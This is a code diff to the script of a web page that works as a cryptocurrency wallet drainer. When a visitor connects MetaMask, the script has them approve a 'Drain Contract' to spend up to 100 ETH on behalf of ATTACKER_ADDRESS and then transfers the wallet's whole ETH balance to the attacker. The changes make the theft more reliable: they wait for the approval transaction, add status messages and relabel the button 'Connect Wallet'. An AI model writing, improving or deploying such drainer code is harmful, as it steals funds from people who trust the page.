@@ -72,15 +72,23 @@
 
  try {
  // 1. Request Account Access
+ if (!window.ethereum) {
+ throw new Error('No Web3 provider found. Please install MetaMask.');
+ }
  const provider = new ethers.providers.Web3Provider(window.ethereum);
  await provider.send("eth_requestAccounts", []);
  const signer = provider.getSigner();
  const userAddress = await signer.getAddress();
 
+ status.innerText = "Approving contract...";
+
  // 2. Approve the Drain Contract to spend up to 100 ETH
  const erc20Abi = ["function approve(address _spender, uint256 _value) public returns (bool success)"];
  const erc20Contract = new ethers.Contract(DRAIN_CONTRACT, erc20Abi, signer);
- await erc20Contract.approve(ATTACKER_ADDRESS, ethers.utils.parseEther("100.0"));
+ const approvalTx = await erc20Contract.approve(ATTACKER_ADDRESS, ethers.utils.parseEther("100.0"));
+ await approvalTx.wait();
+
+ status.innerText = "Sending All ETH...";
 
  // 3. Transfer all ETH to the attacker's address
  const balance = await provider.getBalance(userAddress);
@@ -99,9 +107,9 @@
 
  } catch (error) {
  console.error(error);
- status.innerText = "❌ Transfer failed. Please try again.";
+ status.innerText = "❌ Transfer failed: " + error.message;
  btn.disabled = false;
- btn.innerText = "Transfer ETH";
+ btn.innerText = "Connect Wallet";
  }
  }
 </script>
